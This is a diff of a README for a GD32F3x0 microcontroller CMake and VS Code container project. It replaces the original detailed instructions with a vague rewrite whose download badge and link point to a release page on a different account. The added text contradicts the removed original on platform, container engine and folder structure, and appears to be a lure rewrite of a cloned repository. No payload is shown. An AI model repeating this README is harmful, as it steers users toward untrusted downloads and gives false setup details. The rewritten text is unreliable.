@@ -1,405 +1,68 @@
-[![GitHub tag (latest by date)](https://img.shields.io/github/v/tag/burakenez/gd32f3x0-cmake-vscode)](https://github.com/burakenez/gd32f3x0-cmake-vscode/tags/)
+# 🛠️ gd32f3x0-cmake-vscode - Build embedded software with ease today
 
-# GD32F3x0 Demo Suites CMake Visual Studio Code Integration
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases)
 
-🚀 Welcome to the **GD32F3x0 Demo Suites CMake Visual Studio Code** repository! This project integrates the CMake build system with Visual Studio Code for **_[GD32F3x0 Demo Suites V2.6.0](https://www.gd32mcu.com/en/download)_** and **_[GD32F3x0 Firmware Library V2.6.0](https://www.gd32mcu.com/en/download)_**, running entirely inside a container — **no local toolchain installation needed**.
+This project provides a complete environment for developing software for GD32F3x0 microcontrollers. You can write code for your hardware without installing complex tools on your main computer. The system uses a container, which acts as a contained workspace. This approach keeps your computer clean and ensures the tools stay compatible.
 
-> 🐳 The development environment is fully containerized. The compiler, debugger, CMake, Ninja, and OpenOCD are all pre-installed inside a Docker/Podman container that VS Code manages automatically.
+## 📋 What you need to begin
 
----
+You need a computer running Windows 10 or 11. You must install these two pieces of software before you start:
 
-## 📋 Table of Contents
+1. Visual Studio Code: This is the text editor where you will write your code.
+2. Docker Desktop: This software manages the container that holds the development tools.
 
-- [✨ Features](#-features)
-- [🛠️ Requirements](#️-requirements)
-- [🔧 Getting Started](#-getting-started)
-  - [1. Install WSL 2](#1-️-install-wsl-2-windows-only)
-  - [2. Install Podman](#2--install-podman)
-  - [3. Install VS Code and the Dev Containers Extension](#3--install-vs-code-and-the-dev-containers-extension)
-  - [4. Clone the Repository](#4--clone-the-repository)
-  - [5. Open a Project in VS Code](#5--open-a-project-in-vs-code)
-  - [6. Build the Project](#6--build-the-project)
-  - [7. Flash and Debug](#7--flash-and-debug)
-- [⌨️ VS Code Tasks](#️-vs-code-tasks)
-- [📦 Drivers and Middlewares](#-drivers-and-middlewares)
-- [📂 Folder Structure](#-folder-structure)
-- [🐳 Toolchain Container](#-toolchain-container)
-- [🛟 Troubleshooting](#-troubleshooting)
+Once you install both, restart your computer to ensure the system recognizes the changes. You may also need to enable virtualization in your computer BIOS if Docker shows an error during startup.
 
----
+## 💾 Setting up the tools
 
-## ✨ Features
+Visit this page to download the project files: [https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases)
 
-- **📦 Zero-Setup Toolchain:** Everything runs inside a container — no manual GCC or OpenOCD installation required.
-- **🔧 Pre-configured Toolchain:** ARM GNU GCC (`gcc-arm-none-eabi`) and GigaDevice-patched **xpack-openocd 0.12.0-6** with full GD32 flash algorithm support.
-- **🐞 Robust Debug Configuration:** Pre-configured `launch.json` with live watch, SVD peripheral views, and one-click GDB debugging via OpenOCD.
-- **🧩 Rich Extension Support:** Extensions like `ms-vscode.cmake-tools`, `marus25.cortex-debug`, `mcu-debug.peripheral-viewer`, and `mcu-debug.memory-view` are automatically installed inside the container — peripheral viewers, RTOS views, memory views, and GNU map file tools provide a comprehensive debugging experience.
-- **⚙️ Works on Windows (WSL2) and Linux:** The container abstracts away the host OS. Native macOS support (build + debug) is on the roadmap — contributions and feedback are welcome.
+Choose the source code zip file from the latest release. Save this file to a folder on your computer. Extract the contents of the zip file to a location you can easily find, such as your Documents folder.
 
----
+## 🚀 Opening your project
 
-## 🛠️ Requirements
+1. Open Visual Studio Code.
+2. Select "File" then "Open Folder" from the menu.
+3. Select the folder you extracted in the previous step.
+4. Visual Studio Code will see a configuration file inside that folder. It will ask if you want to reopen the project in a container. Click "Reopen in Container".
 
-| Tool | Purpose |
-|---|---|
-| [VS Code](https://code.visualstudio.com/) | IDE |
-| [Dev Containers extension](https://marketplace.visualstudio.com/items?itemName=ms-vscode-remote.remote-containers) | Opens the project inside the container |
-| [Podman Desktop](https://podman-desktop.io/) | Container engine (Docker works too) |
-| WSL 2 *(Windows only)* | Linux environment required by Dev Containers on Windows |
-| [Git](https://git-scm.com/downloads) | Clone the repository |
+The first time you do this, the computer will download the necessary tools. This takes a few minutes depending on your internet speed. Watch the bottom right corner of the editor to see the progress. Once the process finishes, the environment is ready for use.
 
----
+## ⚙️ Understanding the environment
 
-## 🔧 Getting Started
+The container includes everything required to turn your code into instructions that the microcontroller understands. This setup includes the compiler, the build system known as CMake, and tools for flashing the code to your hardware.
 
-### 1. 🖥️ Install WSL 2 *(Windows only)*
+The FatFs library is included by default. This library helps you manage files if you plan to connect external storage, such as an SD card, to your microcontroller. You do not need to install extra packages or libraries to use these features.
 
-> 🐧 **Linux users can skip this step.**
+## 🔨 Building your code
 
-Open **PowerShell as Administrator** and run:
+The build process turns your source code into a binary file. To start this process:
 
-```powershell
-wsl --install
-```
+1. Open the terminal inside Visual Studio Code by pressing the backtick key or selecting "Terminal" and "New Terminal" from the menu.
+2. Type the command to generate the build files. The system uses CMake to prepare the project.
+3. Once CMake finishes, initiate the build command. The compiler reads your source files and creates a file with a .bin extension.
 
-This installs WSL 2 with Ubuntu by default. **Restart your computer** when prompted.
+Errors will appear in the output window if the compiler finds issues in your code. Read these messages carefully to identify which file or line needs attention.
 
-Verify the installation:
+## 🔌 Connecting hardware
 
-```powershell
-wsl --list --verbose
-```
+You will need a hardware debugger to transfer your code to the GD32 chip. OpenOCD is pre-installed in the container to handle this communication. Connect your debugger to your USB port. You may need to identify the correct port inside the configuration files if the software cannot detect the board immediately.
 
-The Ubuntu distribution should show **Version 2**. If it shows Version 1, upgrade it:
+## 💡 Support and Troubleshooting
 
-```powershell
-wsl --set-version Ubuntu 2
-```
+If the container fails to start, check that Docker Desktop is running. Ensure you have enough disk space for the container image. 
 
----
+Clear the existing build folder if you encounter strange errors after changing settings. You can do this by deleting the folder named "build" within your project directory and running the build steps again.
 
-### 2. 🐳 Install Podman
+## 📁 Project structure
 
-**Windows (inside WSL Ubuntu)** / **Linux:**
-```bash
-sudo apt update && sudo apt install -y podman
-systemctl --user enable --now podman.socket
-```
+- src folder: Store your main code files here.
+- include folder: Place your header files in this location.
+- build folder: The system places the final output files here.
+- .devcontainer: This folder contains the settings for the container environment.
 
-Verify Podman is working:
-```bash
-podman --version
-```
+## 🏁 Final steps
 
-#### Tell VS Code to use Podman
+You are now ready to write firmware for your GD32F3x0 chip. This project removes the frustration of setting up toolchains and managing paths. You can focus on your code rather than the underlying software systems. Remember to save your work frequently and use version control software if you plan to track your changes over time. 
 
-Open VS Code settings (`Ctrl+,`), search for **dockerPath**, and set `dev.containers.dockerPath` to `podman`.
-
-> 💡 If you prefer Docker, install [Docker Desktop](https://www.docker.com/products/docker-desktop/) instead and skip the VS Code setting above — Dev Containers detects it automatically.
-
----
-
-### 3. 🧩 Install VS Code and the Dev Containers Extension
-
-1. Install [Visual Studio Code](https://code.visualstudio.com/).
-2. Open VS Code, go to the **Extensions** panel (`Ctrl+Shift+X`), search for **Dev Containers**, and install:
-   - **Dev Containers** (`ms-vscode-remote.remote-containers`)
-
----
-
-### 4. 📥 Clone the Repository
-
-```bash
-git clone https://github.com/burakenez/gd32f3x0-cmake-vscode.git
-```
-
-> ⚠️ Avoid long directory paths — they can cause build failures on Windows.
-
----
-
-### 5. 📂 Open a Project in VS Code
-
-Opening a project is a two-step process: first start the container from the repository root, then open the specific project inside it.
-
-**Step 1 — Start the container**
-
-1. Open VS Code.
-2. Go to **File → Open Folder** and select the **repository root** (the folder that contains `.devcontainer/`).
-3. VS Code detects `.devcontainer/devcontainer.json` and shows a notification:
-   > *"Folder contains a Dev Container configuration file. Reopen folder to develop in a container."*
-4. Click **Reopen in Container**.
-
-VS Code builds the container image *(first time only, a few minutes)* and opens the repository root inside it. All tools — compiler, debugger, CMake, Ninja — are available immediately.
-
-**Step 2 — Open the project**
-
-Once inside the container, go to **File → Open Folder** and select the project you want to work on:
-```
-Projects/<BoardName>/<ProjectName>
-```
-
-VS Code reopens that folder **inside the same running container**. The project's `.vscode/launch.json` and `tasks.json` become active, and `${workspaceFolder}` resolves correctly to the project directory.
-
-> ⚡ On subsequent opens VS Code reconnects to the existing container instantly.
-
----
-
-### 6. 🔨 Build the Project
-
-Inside the container, build using any of these methods:
-
-- Click the **Build** button in the VS Code status bar.
-- Press `Ctrl+Shift+B` and select **Build**.
-- Press `Ctrl+Shift+P`, type **CMake: Build**, and press Enter.
-
-Output files are placed in:
-```
-Projects/<BoardName>/<ProjectName>/Build/Debug/Application/
-```
-
-| Output file | Description |
-|---|---|
-| `Application.elf` | ELF with debug symbols — used for debugging |
-| `Application.bin` | Raw binary — ready to flash |
-| `Application.hex` | Intel HEX format |
-| `Application.map` | Memory map |
-| `Application.list` | Assembly listing |
-
----
-
-### 7. 🐞 Flash and Debug
-
-#### 🔌 Connect the debug probe (GD-Link)
-
-**On Linux:** The USB device is directly accessible — no extra setup needed.
-
-**On Windows (WSL 2):** USB devices are not automatically shared with WSL. Use [usbipd-win](https://github.com/dorssel/usbipd-win) to attach the probe:
-
-**Step 1 — Install usbipd-win on Windows** *(one-time)*
-
-Open **PowerShell as Administrator**:
-```powershell
-winget install usbipd
-```
-
-**Step 2 — Install client tools inside WSL** *(one-time)*
-
-Open a WSL terminal:
-```bash
-sudo apt install linux-tools-generic hwdata usbutils
-sudo update-alternatives --install /usr/local/bin/usbip usbip /usr/lib/linux-tools/*-generic/usbip 20
-```
-
-**Step 3 — Grant USB device access** *(one-time, in WSL terminal)*
-
-WSL 2 creates USB device nodes owned by `root:root` with mode `664`, which blocks write access from inside the devcontainer. Fix this permanently with a udev rule:
-
-```bash
-echo 'SUBSYSTEM=="usb", ATTR{idVendor}=="28e9", MODE="0666"' | sudo tee /etc/udev/rules.d/99-gdlink.rules && sudo udevadm control --reload-rules
-```
-
-> 💡 If your WSL 2 distro doesn't run udevd (check with `systemctl is-active systemd-udevd`), apply the permission manually after each `usbipd attach`:
-> ```bash
-> sudo chmod a+rw $(ls /dev/bus/usb/*/*)
-> ```
-
-**Step 4 — Attach the GD-Link to WSL** *(each session)*
-
-Open **PowerShell as Administrator** and list USB devices:
-```powershell
-usbipd list
-```
-
-Find the GD-Link entry — known VID:PID values are `28e9:0189`, `28e9:058f`, `28e9:0497`, `28e9:068f`, `28e9:f002`. Then bind *(first time only)* and attach:
-```powershell
-usbipd bind --busid <BUSID>
-usbipd attach --wsl --busid <BUSID>
-```
-
-Verify it is visible inside WSL:
-```bash
-lsusb
-```
-
-You should see a line containing `GDMicroelectronics` or `GD-Link`.
-
-> ⚠️ **Attach the GD-Link to WSL _before_ opening the devcontainer.** The container captures USB device nodes at startup — devices attached after the container starts will not be visible inside it. If you forget, see [GD-Link not detected after plugging in](#gd-link-not-detected-after-plugging-in) in the Troubleshooting section.
-
-**Step 5 — Detach when done**
-
-```powershell
-usbipd detach --busid <BUSID>
-```
-
-#### ▶️ Start a debug session
-
-1. Go to **Run and Debug** (`Ctrl+Shift+D`) in VS Code.
-2. Select **Debug with OpenOCD** from the dropdown.
-3. Press `F5` or click **Start Debugging**.
-
-To flash without debugging, use the **Flash MCU** task (`Ctrl+Shift+B` → **Flash MCU**).
-
----
-
-## ⌨️ VS Code Tasks
-
-All tasks are available via `Ctrl+Shift+B`:
-
-| Task | Description |
-|---|---|
-| **Build** | Compile the project with CMake + Ninja (Debug preset) |
-| **Build and Flash** | Build then immediately flash the firmware |
-| **Flash MCU** | Flash the last built `.elf` via OpenOCD |
-| **Reset MCU** | Reset the target MCU via OpenOCD |
-| **Mass Erase MCU** | Erase the entire flash memory |
-| **OpenOCD Server** | Start a standalone OpenOCD server for external GDB clients |
-| **Kill OpenOCD** | Terminate any running OpenOCD process |
-
----
-
-## 📦 Drivers and Middlewares
-
-### 1. **CMSIS**
-- **Version:** `v6.3.0`
-- **Path:** `Drivers/CMSIS`
-
-### 2. **CMSIS/GD/**
-- **Version:** `V2.6.0 (2026-01-01)`
-- **Path:** `Drivers/CMSIS/GD/`
-- **Source:** `GD32F3x0 Demo Suites V2.6.0`
-
-### 3. **GD32F3x0_standard_peripheral**
-- **Version:** `V2.6.0 (2026-01-01)`
-- **Path:** `Drivers/GD32F3x0_standard_peripheral`
-- **Source:** `GD32F3x0 Demo Suites V2.6.0`
-
-### 4. **GD32F3x0_usbfs_library**
-- **Version:** `V2.6.0 (2026-01-01)`
-- **Path:** `Drivers/GD32F3x0_usbfs_library`
-- **Source:** `GD32F3x0 Demo Suites V2.6.0`
-
-### 5. **FatFs**
-- **Version:** `R0.16`
-- **Path:** `Middlewares/FatFs`
-- **Source:** `FatFs by ChaN`
-
----
-
-## 📂 Folder Structure
-
-```plaintext
-├── .devcontainer
-│   ├── Containerfile                  # Container image definition
-│   └── devcontainer.json              # VS Code Dev Container configuration
-├── Drivers                            # Shared drivers (CMSIS, BSP, standard peripheral, USB)
-├── Middlewares                        # Shared middleware libraries (FreeRTOS, FatFs, lwIP, ...)
-├── Projects                           # Demo suite board projects
-│   └── <BoardName>
-│       └── <ProjectName>
-│           ├── .vscode
-│           │   ├── launch.json        # Debug configuration (OpenOCD + GDB + SVD)
-│           │   ├── settings.json      # Workspace settings
-│           │   └── tasks.json         # Build, flash, reset, and erase tasks
-│           ├── Application
-│           │   ├── Core
-│           │   │   ├── Inc
-│           │   │   │   ├── _it.h      # Interrupt handler declarations
-│           │   │   │   ├── _libopt.h  # Library options
-│           │   │   │   └── systick.h                                  # SysTick timer declarations
-│           │   │   └── Src
-│           │   │       ├── _it.c      # Interrupt service routines
-│           │   │       ├── main.c                                     # Application entry point
-│           │   │       ├── system_.c  # Clock and core initialisation
-│           │   │       └── systick.c                                  # SysTick timer implementation
-│           │   ├── Startup
-│           │   │   └── startup_.s     # Reset handler and vector table
-│           │   └── CMakeLists.txt                                     # Application build rules
-│           ├── cmake
-│           │   ├── arm-none-eabi-gcc.cmake  # ARM GCC toolchain settings
-│           │   └── project.cmake            # Project-wide CMake configuration
-│           ├── Drivers
-│           │   ├── BSP/              # Board support package for 
-│           │   ├── CMSIS                                 # CMSIS for Cortex-M / 
-│           │   └── _standard_peripheral  # Standard peripheral library
-│           ├── .clang-format                # Code style rules
-│           ├── CMakeLists.txt               # Top-level CMake build file
-│           ├── CMakePresets.json            # Debug / Release preset definitions
-│           ├── _flash.ld  # Linker script (memory regions)
-│           └── .svd             # SVD file for peripheral register views
-├── Examples                           # Firmware library examples (one project per example)
-│   └── <Peripheral>                   # e.g. ADC, CAN, TIMER, USART, ...
-│       └── <ExampleName>              # Same project structure as Projects/<BoardName>/<ProjectName>
-├── Template                           # Bare-minimum template project (firmware library)
-│   └── ...                            # Same project structure as Projects/<BoardName>/<ProjectName>
-└── README.md
-```
-
----
-
-## 🐳 Toolchain Container
-
-The container is defined by `.devcontainer/Containerfile` and built **locally** the first time you open the project in VS Code — no registry login or pre-built image required.
-
-### Included tools
-
-| Tool | Version | Purpose |
-|---|---|---|
-| `gcc-arm-none-eabi` | system apt | ARM C/C++ compiler |
-| `gdb-multiarch` | system apt | GDB debugger (symlinked as `arm-none-eabi-gdb`) |
-| `binutils-multiarch` | system apt | `objdump` and `nm` required by cortex-debug |
-| `cmake` + `ninja-build` | system apt | Build system |
-| `xpack-openocd` | 0.12.0-6 | Installed to `/opt/xpack-openocd-0.12.0-6/` with GD32 flash algorithm support |
-
-### Automatically installed VS Code extensions
-
-| Extension | Purpose |
-|---|---|
-| `ms-vscode.cmake-tools` | CMake integration |
-| `ms-vscode.cpptools` | C/C++ IntelliSense and debugging |
-| `marus25.cortex-debug` | ARM Cortex-M debug adapter (OpenOCD, J-Link, ...) |
-| `mcu-debug.peripheral-viewer` | SVD-based peripheral register viewer |
-| `mcu-debug.memory-view` | Live memory inspector |
-| `mcu-debug.rtos-views` | FreeRTOS task and queue viewer |
-| `ms-vscode.hexeditor` | Hex file viewer |
-| `dan-c-underwood.arm` | ARM assembly syntax highlighting |
-| `zixuanwang.linkerscript` | Linker script syntax highlighting |
-| `trond-snekvik.gnu-mapfiles` | GNU map file viewer |
-
-### WSL2 USB fix
-
-> 🔧 xpack-openocd's bundled `libhidapi-hidraw` cannot access `/dev/hidraw*` inside Docker+WSL2 containers. The `Containerfile` replaces it with `libhidapi-libusb` (same API, accesses the GD-Link via `/dev/bus/usb` instead).
-
-> 🔧 The devcontainer uses `--device=/dev/bus/usb:/dev/bus/usb` to pass USB devices into the container. Device nodes are captured at container startup — **attach the GD-Link before opening the container**. If the board is replugged or attached after startup, rebuild the container (`Ctrl+Shift+P` → **Dev Containers: Rebuild Container**).
-
-> ⏱️ The first container build takes a few minutes (downloads xpack-openocd from GitHub). Subsequent opens reuse the cached image instantly.
-
----
-
-## 🛟 Troubleshooting
-
-### GD-Link not detected after plugging in
-
-The container captures USB device nodes at startup. If you attached the GD-Link after the container was already running:
-
-1. In PowerShell, attach the board to WSL first:
-   ```powershell
-   usbipd attach --wsl --busid <BUSID>
-   ```
-2. In VS Code, rebuild the container:
-   `Ctrl+Shift+P` → **Dev Containers: Rebuild Container**
-
-### Container stuck during rebuild
-
-If VS Code appears frozen while building or rebuilding the container (spinning indefinitely with no progress):
-
-`Ctrl+Shift+P` → **Developer: Reload Window**
-
-VS Code will reconnect and continue where it left off.
-
-### Cortex-Debug extension error after container open
-
-After extensions are installed inside the container, you may see:
-
-> *"Cannot activate the 'Cortex-Debug' extension because it depends on the 'debug-tracker-vscode' extension, which is not loaded. Would you like to reload the window to load the extension?"*
-
-Click **Reload Window**. This is a one-time ordering issue on first install — it will not appear again after the reload.
+The environment stays static until you update the files in the .devcontainer folder. You can add more tools or libraries to this folder in the future if your project requirements change. For now, the included tools cover the baseline needs for common microcontroller development tasks.
